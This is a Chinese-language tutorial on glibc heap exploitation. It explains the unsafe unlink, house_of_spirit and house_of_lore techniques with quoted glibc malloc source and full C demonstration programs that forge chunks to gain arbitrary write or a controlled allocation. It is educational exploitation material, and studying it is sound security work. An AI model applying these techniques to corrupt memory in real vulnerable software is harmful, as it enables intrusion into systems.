<p>先来看看如果unlink机制没有防护会发生什么 假设下图是目前的chunk情况</p>
<p><img src="https://s2.ax1x.com/2020/02/02/1JK56J.png" alt="1JK56J.png"></p>
<p>当执行<code>free(chunk1)</code>时 就会触发<code>unlink</code>机制 即会进行下面的操作</p>
<blockquote>
<p>chunk2.bk.fd=chunk2.fd</p>
<p>chunk2.fd.bk=chunk2.bk</p>
</blockquote>
<p>似乎看起来没什么毛病 但是当chunk2由于各种情况 利于溢出啊 double free啊等 fd和bk指针可控时 就会造成任意地址可写 当将chunk2.fd填入需要写的addr chunk2.bk填入需要写入的value时 </p>
<blockquote>
<p>chunk1.fd=addr</p>
<p>addr+3*8=value</p>
</blockquote>
<p>那么在64位情况下 只需要将fd指针填入addr-3*8即可达到任意地址写的目的 但是在实际中 glibc是对<code>unlink</code>有检验的</p>
<pre class=" language-c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                \
      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">)</span><span class="token punctuation">;</span> \
    <span class="token keyword">else</span> <span class="token punctuation">{</span>                                                               \
      FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>                                                       \
      BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>                                                       \
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>size<span class="token punctuation">)</span>                      \
      <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        \
        <span class="token function">assert</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span><span class="token punctuation">;</span>               \
        <span class="token function">assert</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre>
<p>可以从源码读出 实际对<code>unlink</code>的要求是</p>
<blockquote>
<p>chunk2.fd.bk==chunk2 || chunk2.bk.fd==chunk2</p>
</blockquote>
<p>那么将上面无防护时的值带进来</p>
<blockquote>
<p>addr-3*8+3*8=chunk2 -> addr=chunk2</p>
<p>value+2*8=chunk2 -> value=chunk2-2*8</p>
</blockquote>
<p>即当把chunk2.fd覆盖为chunk2-3*8 chunk2.bk覆盖为chunk2-2*8就可以绕过检测 绕过检测后开始删除链表</p>
<blockquote>
<p>因为 chunk2.bk.fd=chunk2 && chunk2.fd.bk=chunk2</p>
<p>所以 chunk2=chunk2.fd -> chunk2=chunk2-3*8</p>
</blockquote>
<p>经过限制后 似乎<code>unlink</code>机制只能实现将chunk2的指针向前提了3*8个字节的位置 但是如果chunk2是一个全局变量 处于bss段上 那么就可以通过预设bss段的指针来实现任意位置写</p>
<p>测试样例</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>


uint64_t <span class="token operator">*</span>chunk0_ptr<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Welcome to unsafe unlink 2.0!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> malloc_size <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//we want to be big enough not to use fastbins</span>
    <span class="token keyword">int</span> header_size <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    chunk0_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk0</span>
    uint64_t <span class="token operator">*</span>chunk1_ptr  <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chunk1</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The global chunk0_ptr is at %p, pointing to %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token punctuation">,</span> chunk0_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The victim chunk we are going to corrupt is at %p\n\n"</span><span class="token punctuation">,</span> chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We create a fake chunk inside chunk0.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P->fd->bk = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P->bk->fd = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Fake chunk fd: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Fake chunk bk: %p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uint64_t <span class="token operator">*</span>chunk1_hdr <span class="token operator">=</span> chunk1_ptr <span class="token operator">-</span> header_size<span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc_size<span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk1_hdr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> victim_string<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>victim_string<span class="token punctuation">,</span><span class="token string">"Hello!~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span> victim_string<span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Original value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk0_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414142424242LL</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"New Value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最后再解释下后面几句是在干嘛 当执行完<code>free(chunk1_ptr1)</code>时 此时的<code>chunk0_ptr=chunk0_ptr-3</code> 然后再<code>chunk0_ptr[3] = (uint64_t) victim_string</code> 此时的指针情况就是 <code>chunk0_ptr->chunk0_ptr-3->victim_string</code> 然后后面改写值就合理了 也就造成了任意地址写</p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>这个案例主要是对<code>fastbin</code>进行攻击 可以通过构建一个假的chunk结构 在<code>free</code>掉这个假的chunk后 就可以通过再次<code>malloc</code>来拿到特定地址的指针 造成任意可控 通过描述可以发现 其实<code>house_of_spirit</code>并不能单独达到<code>getshell</code>的目的 而是一种通过堆的<code>fastbin</code>机制来辅助栈溢出的手法 一般的栈溢出都要求覆盖掉返回地址以达到控制<code>EIP</code>的目的 但是如果栈溢出的长度不够 无法直接溢出到返回地址 但是却可以溢出到一个可以被<code>free</code>的指针 那么我们就可以通过覆盖指针地址 且在指针指向的地址伪造出一个chunk结构来达到控制返回地址的目的</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates the house of spirit attack.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Calling malloc() once so that it sets up its memory.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this is the size</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// nextsize</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the overwritten pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(0x30): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>但是<code>free</code>函数的执行是有条件的  在伪造chunk的时候 首先是需要注意标志位 chunk的低三位是标志位 最后一位<code>PREV_INUSE</code>位不影响<code>free</code>函数的执行 但是<code>IS_MMAPPED</code>位和<code>NON_MAIN_ARENA</code>都需要为0 其次是需要注意<code>size</code>字段的大小 必须是在<code>fastbin</code>的范围内 即32-128(bytes)之间 最后<code>free</code>函数不光对指针指向的chunk进行检测 他同样还会检测物理相邻的chunk是否正常 <code>free</code>函数会检测<code>next chunk</code>的<code>size</code>字段的值是否大于<code>2*SIZE_SZ</code>且小于<code>av->system_mem</code> 即在16-128(bytes)之间 释放成功之后的效果如下图</p>
<p><img src="https://s2.ax1x.com/2020/02/04/10Tqt1.png" alt="10Tqt1.png"></p>
<h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h3><p>之前的<code>house_of_spirit</code>是针对<code>fastbin</code>进行的攻击 而<code>house_of_lore</code>则是针对<code>small bin</code>进行的攻击 <code>house_of_lore</code>可以造成在任意指定位置上申请一个chunk 从而造成修改任意地址的内存 当然使用<code>house_of_lore</code>也是有要求的 他要求能够控制<code>small bin</code>的<code>bk</code>指针 并且控制指定位置的<code>fd</code>指针 攻击利用的原理是 如果在执行<code>malloc</code>的时候 申请的内存块是在<code>small bin</code>内 那么就会执行以下流程</p>
<pre class=" language-c"><code class="language-c">  <span class="token comment" spellcheck="true">//检测申请的内存块是不是在smallbin中</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token comment" spellcheck="true">//获取smallbin的索引</span>
      idx <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment" spellcheck="true">//获取bin中对应chunk的索引</span>
      bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment" spellcheck="true">//victim等于smallbin中最后的chunk 且victim!=bin 即victim不为空</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token comment" spellcheck="true">//获取victim的上一个chunk</span>
          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
          <span class="token comment" spellcheck="true">//如果victim上一个chunk的fd指针没有指向victim则程序报错</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): smallbin double linked list corrupted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment" spellcheck="true">//设置victim的INUSE位</span>
          <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment" spellcheck="true">//修改链表</span>
          bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
          bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>

          <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>
        <span class="token function">set_non_main_arena</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>
      <span class="token comment" spellcheck="true">/* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */</span>
      size_t tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          mchunkptr tc_victim<span class="token punctuation">;</span>

          <span class="token comment" spellcheck="true">/* While bin not empty and tcache not full, copy chunks over.  */</span>
          <span class="token keyword">while</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count
             <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
              bck <span class="token operator">=</span> tc_victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
              <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>
            <span class="token function">set_non_main_arena</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
              bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
              bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>

              <span class="token function">tcache_put</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> p<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>
<p>其中最主要的为</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//获取victim的上一个chunk</span>
          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
          <span class="token comment" spellcheck="true">//如果victim上一个chunk的fd指针没有指向victim则程序报错</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): smallbin double linked list corrupted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
